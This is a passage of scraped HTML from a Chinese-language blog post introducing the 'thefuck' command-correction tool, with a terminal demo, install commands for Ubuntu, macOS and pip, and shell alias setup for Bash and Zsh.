!important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n➜ aptget install vim\r\nNo command 'aptget' found, did you mean:\r\n Command 'apt-get' from package 'apt' (main)\r\nzsh: command not found: aptget\r\n➜ fuck\r\naot-get install vim [enter/ctrl-c]\r\nE: Could not open lock file /var/lib/dpkg/lock - open (13: Permission denied)\r\nE: Unable to lock the administration directory (/var/lib/dpkg), are you root?</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f0762f5931918018-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762f5931918018-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762f5931918018-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762f5931918018-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762f5931918018-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762f5931918018-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762f5931918018-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762f5931918018-8\">8</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f0762f5931918018-1\">➜<span class=\"crayon-h\"> </span><span class=\"crayon-e\">aptget </span><span class=\"crayon-e\">install </span><span class=\"crayon-e\">vim</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762f5931918018-2\"><span class=\"crayon-e\">No </span><span class=\"crayon-i\">command</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'aptget'</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">found</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">did </span><span class=\"crayon-e\">you </span><span class=\"crayon-v\">mean</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-594b05f0762f5931918018-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Command</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'apt-get'</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">from </span><span class=\"crayon-t\">package</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'apt'</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">main</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762f5931918018-4\"><span class=\"crayon-v\">zsh</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">command </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">found</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">aptget</span></div><div class=\"crayon-line\" id=\"crayon-594b05f0762f5931918018-5\">➜<span class=\"crayon-h\"> </span><span class=\"crayon-e\">fuck</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762f5931918018-6\"><span class=\"crayon-v\">aot</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">install </span><span class=\"crayon-i\">vim</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">enter</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">ctrl</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-594b05f0762f5931918018-7\"><span class=\"crayon-v\">E</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Could </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">open </span><span class=\"crayon-e\">lock </span><span class=\"crayon-v\">file</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dpkg</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lock</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">open</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">13</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Permission </span><span class=\"crayon-v\">denied</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762f5931918018-8\"><span class=\"crayon-v\">E</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Unable </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">lock </span><span class=\"crayon-e\">the </span><span class=\"crayon-e\">administration </span><span class=\"crayon-e\">directory</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">dpkg</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">are </span><span class=\"crayon-e\">you </span><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">?</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0023 seconds] -->\r\n<p>还需要权限？再来！</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f0762f8340338430\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n➜ fuck\r\nsudo apt-get install vim [enter/ctrl-c]\r\n[sudo] password for nvbn:\r\nReading package lists... Done\r\nBuilding dependency tree... 0%\r\n... ...</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f0762f8340338430-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762f8340338430-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762f8340338430-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762f8340338430-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762f8340338430-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762f8340338430-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f0762f8340338430-1\">➜<span class=\"crayon-h\"> </span><span class=\"crayon-e\">fuck</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762f8340338430-2\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">install </span><span class=\"crayon-i\">vim</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">enter</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">ctrl</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">c</span><span class=\"crayon-sy\">]</span></div><div class=\"crayon-line\" id=\"crayon-594b05f0762f8340338430-3\"><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">sudo</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">password </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">nvbn</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762f8340338430-4\"><span class=\"crayon-e\">Reading </span><span class=\"crayon-t\">package</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">lists</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Done</span></div><div class=\"crayon-line\" id=\"crayon-594b05f0762f8340338430-5\"><span class=\"crayon-e\">Building </span><span class=\"crayon-e\">dependency </span><span class=\"crayon-v\">tree</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-o\">%</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762f8340338430-6\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0012 seconds] -->\r\n<p><img id=\"pic\" src=\"http://wx4.sinaimg.cn/large/63918611gy1ff9imdhdtfg20j20ajdz4.gif\"></p>\n<p>好了，我想你肯定也想拥有这样的神器，请如此这般……</p>\n<h3>我要这个神器！</h3>\n<h4>环境需求</h4>\n<p>首先，你需要这些：</p>\n<ul>\n<li>python (2.7+ or 3.3+)</li>\n<li>pip</li>\n<li>python-dev</li>\n</ul>\n<h4>安装</h4>\n<p>然后，在不同的操作系统上（没错，有 Python 的地方就行）：</p>\n<p>在 Ubuntu 上可以通过 <code>apt</code> 安装：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f0762fc908743464\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo apt update\r\nsudo apt install python3-dev python3-pip\r\npip3 install --user thefuck</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f0762fc908743464-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594b05f0762fc908743464-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594b05f0762fc908743464-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f0762fc908743464-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">apt </span><span class=\"crayon-e\">update</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594b05f0762fc908743464-2\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">apt </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">python3</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">dev </span><span class=\"crayon-v\">python3</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">pip</span></div><div class=\"crayon-line\" id=\"crayon-594b05f0762fc908743464-3\"><span class=\"crayon-e\">pip3 </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">user </span><span class=\"crayon-v\">thefuck</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>OS X 上使用 <a href=\"http://brew.sh/\">Homebrew</a> 来安装：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f0762ff503179379\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nbrew install thefuck</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f0762ff503179379-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f0762ff503179379-1\"><span class=\"crayon-e\">brew </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">thefuck</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>其它的系统上，只要你有 <code>pip</code> 就行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f076302514326596\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npip install --user thefuck</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f076302514326596-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f076302514326596-1\"><span class=\"crayon-e\">pip </span><span class=\"crayon-v\">install</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">user </span><span class=\"crayon-v\">thefuck</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>更多的 Linux 发行版，可以看<a href=\"https://github.com/nvbn/thefuck/wiki/Installation\">这里</a>。</p>\n<h4>设置别名</h4>\n<p>上述安装的软件包名字是：“thefuck”——别问我为啥不能直接叫 “fuck”。所以，你可以设置个别名：</p>\n<p><strong>Bash</strong></p>\n<p>将下述行加入到 <code>.bashrc</code> 或 <code>.bash_profile</code> （用于 OSX）：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f076305250908466\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\neval \"$(thefuck --alias)\"</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f076305250908466-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f076305250908466-1\"><span class=\"crayon-i\">eval</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"$(thefuck --alias)\"</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><a id=\"user-content-zsh\" href=\"https://github.com/nvbn/thefuck/wiki/Shell-aliases#zsh\"></a><strong>ZSH</strong></p>\n<p>将下述行加入到 <code>.zshrc</code>:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f076308657359973\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\neval \"$(thefuck --alias)\"</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594b05f076308657359973-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594b05f076308657359973-1\"><span class=\"crayon-i\">eval</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"$(thefuck --alias)\"</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>其它的 shell ，包括 powershell，可以参考<a href=\"https://github.com/nvbn/thefuck/wiki/Shell-aliases\">这里</a>。</p>\n<p>当然，我觉得我更喜欢给它起个别名叫 “<code>kao</code>”。:D</p>\n<p>要让别名立刻生效，你需要用 <code>source</code> 命令，如：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594b05f07630b358817791\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div 